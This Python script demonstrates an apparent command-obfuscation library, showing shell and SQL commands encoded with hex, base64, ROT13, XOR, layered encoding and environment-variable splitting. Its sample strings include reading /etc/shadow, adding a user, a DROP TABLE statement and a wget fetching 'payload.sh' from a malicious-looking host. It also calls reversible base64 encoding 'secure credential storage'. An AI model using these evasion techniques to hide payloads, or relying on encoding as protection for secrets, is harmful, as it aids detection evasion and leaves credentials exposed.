#!/usr/bin/env python3

"""
Practical examples of command obfuscation in real scenarios
"""

import os
import json
from obfuscator import CommandObfuscator


def example_1_basic_encoding():
    """Example 1: Basic command encoding"""
    print("\n" + "=" * 60)
    print("EXAMPLE 1: Basic Command Encoding")
    print("=" * 60)

    obf = CommandObfuscator()

    # Scenario: Obfuscate a directory listing command
    command = "ls -lh /var/www/html"

    print(f"\nOriginal command: {command}")
    print(f"\nEncoding methods:")
    print(f"  Hex:      {obf.hex_encode(command)}")
    print(f"  Base64:   {obf.b64_encode(command)}")
    print(f"  ROT13:    {obf.rot13(command)}")


def example_2_secure_credential_storage():
    """Example 2: Store credentials securely"""
    print("\n" + "=" * 60)
    print("EXAMPLE 2: Secure Credential Storage")
    print("=" * 60)

    obf = CommandObfuscator()

    # Scenario: Store API credentials with verification
    api_key = "sk-abc123def456ghi789jkl"
    db_password = "MySecurePassword123!"

    print(f"\nOriginal API Key: {api_key}")

    # Encode with hash verification
    encoded_key, key_hash = obf.obfuscate_with_hash(api_key)
    encoded_pass, pass_hash = obf.obfuscate_with_hash(db_password)

    # Save to config
    config = {
        "api": {
            "key_encoded": encoded_key,
            "key_hash": key_hash
        },
        "database": {
            "password_encoded": encoded_pass,
            "password_hash": pass_hash
        }
    }

    print(f"\nEncoded API Key: {encoded_key}")
    print(f"Hash: {key_hash[:32]}...")
    print(f"\nConfig would be saved as JSON with encoded values")
    print(f"Sample config structure:")
    print(json.dumps(config, indent=2)[:200] + "...")


def example_3_command_audit_trail():
    """Example 3: Audit trail with command verification"""
    print("\n" + "=" * 60)
    print("EXAMPLE 3: Command Audit Trail")
    print("=" * 60)

    obf = CommandObfuscator()

    # Scenario: Log sensitive commands with integrity check
    commands_executed = [
        "grep -r 'password' /etc/",
        "cat /etc/shadow",
        "sudo useradd newuser",
        "curl -H 'Authorization: Bearer token' https://api.example.com"
    ]

    audit_log = []

    print(f"\nAudit Trail with Verification:\n")

    for cmd in commands_executed:
        encoded, cmd_hash = obf.obfuscate_with_hash(cmd)

        log_entry = {
            "timestamp": "2026-06-29T12:00:00Z",
            "command_encoded": encoded,
            "command_hash": cmd_hash,
            "method": "b64_with_sha256"
        }

        audit_log.append(log_entry)

        # Verify
        is_valid = obf.verify_obfuscated(encoded, cmd_hash)
        status = "✓ VERIFIED" if is_valid else "✗ TAMPERED"

        print(f"Command: {cmd[:40]:40s} | {status}")

    print(f"\nTotal commands logged: {len(audit_log)}")


def example_4_multi_layer_sensitive_data():
    """Example 4: Multi-layer obfuscation for sensitive data"""
    print("\n" + "=" * 60)
    print("EXAMPLE 4: Multi-Layer Obfuscation")
    print("=" * 60)

    obf = CommandObfuscator()

    # Scenario: Obfuscate with multiple layers
    sensitive = "DROP TABLE users; DELETE FROM logs WHERE date < '2026-01-01';"

    print(f"\nSensitive SQL Command:")
    print(f"  {sensitive}")

    # Single layer
    layer_1 = obf.b64_encode(sensitive)
    print(f"\n1-Layer (Base64):")
    print(f"  {layer_1}")

    # Multi-layer
    layer_3 = obf.multi_layer_encode(sensitive, layers=3)
    print(f"\n3-Layer (Hex → Base64 → ROT13):")
    print(f"  {layer_3}")

    # Verify decoding
    decoded = obf.multi_layer_decode(layer_3, layers=3)
    print(f"\nDecoded successfully: {decoded == sensitive}")


def example_5_scripted_execution():
    """Example 5: Obfuscated command execution pattern"""
    print("\n" + "=" * 60)
    print("EXAMPLE 5: Obfuscated Execution Pattern")
    print("=" * 60)

    obf = CommandObfuscator()

    # Scenario: Store and execute obfuscated commands

    # Define commands to obfuscate
    commands = {
        "check_users": "cat /etc/passwd | wc -l",
        "list_processes": "ps aux | grep python",
        "disk_usage": "df -h | grep /"
    }

    print(f"\nCommand Repository (Obfuscated):\n")

    obfuscated_repo = {}

    for name, cmd in commands.items():
        encoded = obf.multi_layer_encode(cmd, layers=2)
        obfuscated_repo[name] = encoded
        print(f"{name:20s}: {encoded[:50]}...")

    # Simulate retrieval and execution
    print(f"\n\nExecution Simulation:")
    print(f"- Retrieve 'check_users' command")
    retrieved = obfuscated_repo["check_users"]
    print(f"- Obfuscated: {retrieved[:40]}...")

    decoded = obf.multi_layer_decode(retrieved, layers=2)
    print(f"- Decoded: {decoded}")
    print(f"- Ready for execution (not executed for safety)")


def example_6_comparison_methods():
    """Example 6: Compare different encoding methods"""
    print("\n" + "=" * 60)
    print("EXAMPLE 6: Encoding Method Comparison")
    print("=" * 60)

    obf = CommandObfuscator()

    test_cmd = "wget https://malicious.site/payload.sh"

    print(f"\nOriginal: {test_cmd}")
    print(f"Length:   {len(test_cmd)} bytes\n")

    methods = {
        "Hex": obf.hex_encode(test_cmd),
        "Base64": obf.b64_encode(test_cmd),
        "ROT13": obf.rot13(test_cmd),
        "Reverse": obf.reverse(test_cmd),
        "Caesar": obf.caesar_cipher(test_cmd, 5),
        "Multi-3": obf.multi_layer_encode(test_cmd, 3),
    }

    print(f"{'Method':<15} {'Encoded':<50} {'Length':<8}")
    print("-" * 75)

    for method, encoded in methods.items():
        # Convert bytes to string if needed
        if isinstance(encoded, bytes):
            encoded_str = encoded.hex()[:47]
        else:
            encoded_str = encoded[:47]

        print(f"{method:<15} {encoded_str:<50} {len(str(encoded)):<8}")


def example_7_environment_variable_construction():
    """Example 7: Build commands from environment variables"""
    print("\n" + "=" * 60)
    print("EXAMPLE 7: Environment Variable Construction")
    print("=" * 60)

    obf = CommandObfuscator()

    print(f"\nEnvironment variables setup:")
    print(f"  CMD_GREP = grep")
    print(f"  FLAG_RECURSIVE = -r")
    print(f"  FLAG_IGNORE_CASE = -i")

    # Build command from parts
    cmd = obf.dynamic_command_builder("$CMD_GREP", "$FLAG_RECURSIVE", "$FLAG_IGNORE_CASE", "pattern", "/path")

    print(f"\nBuilt command: {cmd}")
    print(f"This approach obfuscates by splitting command into env vars")


def example_8_xor_encryption():
    """Example 8: XOR encryption with keys"""
    print("\n" + "=" * 60)
    print("EXAMPLE 8: XOR Encryption")
    print("=" * 60)

    obf = CommandObfuscator()

    # Scenario: Encrypt with XOR
    message = "SECRET_API_KEY_12345"
    key = "cryptokey"

    print(f"\nOriginal message: {message}")
    print(f"Encryption key:   {key}")

    encrypted = obf.xor_encode(message, key)
    print(f"\nEncrypted (hex): {encrypted.hex()}")

    decrypted = obf.xor_decode(encrypted, key)
    print(f"Decrypted:       {decrypted}")
    print(f"Match:           {message == decrypted}")


def example_9_all_transformations():
    """Example 9: All transformations on same input"""
    print("\n" + "=" * 60)
    print("EXAMPLE 9: All Transformations")
    print("=" * 60)

    obf = CommandObfuscator()

    cmd = "admin"

    print(f"\nTransformations of '{cmd}':\n")

    transformations = {
        "Original": cmd,
        "Hex": obf.hex_encode(cmd),
        "Base64": obf.b64_encode(cmd),
        "ROT13": obf.rot13(cmd),
        "Reverse": obf.reverse(cmd),
        "Caesar(+3)": obf.caesar_cipher(cmd, 3),
        "Caesar(+13)": obf.caesar_cipher(cmd, 13),
        "CharSub": obf.character_substitution(cmd),
    }

    for name, transformed in transformations.items():
        if isinstance(transformed, bytes):
            transformed = transformed.hex()
        print(f"{name:15} → {transformed}")


def run_all_examples():
    """Run all examples"""
    examples = [
        example_1_basic_encoding,
        example_2_secure_credential_storage,
        example_3_command_audit_trail,
        example_4_multi_layer_sensitive_data,
        example_5_scripted_execution,
        example_6_comparison_methods,
        example_7_environment_variable_construction,
        example_8_xor_encryption,
        example_9_all_transformations,
    ]

    print("\n" + "=" * 60)
    print("COMMAND OBFUSCATION PRACTICAL EXAMPLES")
    print("=" * 60)

    for example_func in examples:
        try:
            example_func()
        except Exception as e:
            print(f"\nError in {example_func.__name__}: {e}")

    print("\n" + "=" * 60)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 60)


if __name__ == "__main__":
    run_all_examples()
